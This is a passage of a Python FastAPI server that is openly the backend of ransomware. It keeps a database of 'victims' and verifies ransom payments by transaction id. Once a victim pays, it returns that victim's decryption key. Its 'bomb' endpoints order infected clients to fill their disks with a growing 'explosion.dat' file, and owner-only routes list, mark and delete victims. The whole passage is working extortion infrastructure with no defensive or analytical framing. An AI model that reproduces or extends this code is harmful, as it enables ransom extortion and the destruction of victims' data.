        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/verify-payment")
async def api_verify_payment(payment_data: PaymentVerify):
    """Verify payment from client"""
    try:
        # Update victim
        db_update('victims', {
            'status': 'paid',
            'paid_at': datetime.utcnow().isoformat(),
            'tx': payment_data.tx_id
        }, 'id = ?', [payment_data.victim_id])
        
        # Get key
        victim = db_get_one('SELECT key FROM victims WHERE id = ?', (payment_data.victim_id,))
        key = victim['key'] if victim else None
        
        log_action('payment', f'Payment for {payment_data.victim_id}: {payment_data.tx_id}')
        
        return {'success': True, 'key': key}
        
    except Exception as e:
        print(f"Error verifying payment: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# ============================================================================
# ROUTES - API (Bomb Commands)
# ============================================================================

@app.get("/api/bomb/command/{victim_id}")
async def api_get_bomb_command(victim_id: str):
    """Get pending bomb command"""
    victim = db_get_one('SELECT bomb_status FROM victims WHERE id = ?', (victim_id,))
    
    if victim and victim.get('bomb_status') == 'active':
        return {'action': 'start', 'filename': 'explosion.dat'}
    
    return {'action': 'none'}

@app.post("/api/bomb/update")
async def api_bomb_update(bomb_data: BombUpdate):
    """Update bomb status"""
    try:
        update_dict = {}
        
        if bomb_data.error:
            update_dict['bomb_status'] = 'error'
        else:
            update_dict['bomb_size'] = bomb_data.size_gb
        
        db_update('victims', update_dict, 'id = ?', [bomb_data.client_id])
        
        return {'success': True}
        
    except Exception as e:
        print(f"Error updating bomb: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# ============================================================================
# ROUTES - API (Owner Only)
# ============================================================================

@app.post("/api/owner/login")
async def api_owner_login(login_data: OwnerLogin):
    """Owner login API"""
    if login_data.owner_id == Config.OWNER_ID and login_data.password == Config.OWNER_PASSWORD:
        log_action('owner_login', 'Owner logged in')
        return {'success': True}
    
    raise HTTPException(status_code=401, detail="Invalid credentials")

@app.post("/api/owner/logout")
async def api_owner_logout():
    """Owner logout"""
    return {'success': True}

@app.get("/api/owner/victims")
async def api_owner_victims():
    """Get all victims (owner only)"""
    try:
        victims = db_execute('SELECT * FROM victims ORDER BY created DESC')
        return victims
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/owner/victim/{victim_id}")
async def api_owner_victim(victim_id: str):
    """Get single victim (owner only)"""
    try:
        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
        
        if not victim:
            raise HTTPException(status_code=404, detail="Not found")
        
        return victim
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/owner/mark-paid/{victim_id}")
async def api_owner_mark_paid(victim_id: str):
    """Mark victim as paid"""
    try:
        db_update('victims', {
            'status': 'paid',
            'paid_at': datetime.utcnow().isoformat()
        }, 'id = ?', [victim_id])
        
        log_action('mark_paid', f'Marked {victim_id} as paid')
        
        return {'success': True}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/owner/delete-victim/{victim_id}")
async def api_owner_delete_victim(victim_id: str):
    """Delete victim (careful!)"""
    try:
        db_execute('DELETE FROM victims WHERE id = ?', (victim_id,))
        log_action('delete_victim', f'Deleted {victim_id}')
        return {'success': True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    uvicorn.run(
        "main:app",
        host=Config.HOST,
        port=Config.PORT,
        reload=Config.DEBUG
    )
